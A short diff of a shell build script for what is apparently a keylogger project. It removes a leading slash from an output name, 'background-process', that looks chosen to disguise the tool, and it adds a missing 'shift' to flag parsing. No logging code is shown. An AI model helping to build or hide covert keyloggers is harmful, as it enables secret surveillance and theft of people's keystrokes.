@@ -6,7 +6,7 @@
 # run this using dash to ensure greatest extent of POSIX compliance accross platforms
 # the executable will be moved to ~/-outputname
 
-outputname='/background-process'
+outputname='background-process'
 
 # these two can be set inside keylogger.py so only record if entered 
 passphrase=''
@@ -34,6 +34,8 @@ do
         '-l') logsmethod="$item" ;;
         *) echo "invalid flag ($flag)" 1>&2 ; exit 2 ;;
     esac
+
+    shift
 done
 
 # check only lowercase letters and hyphens
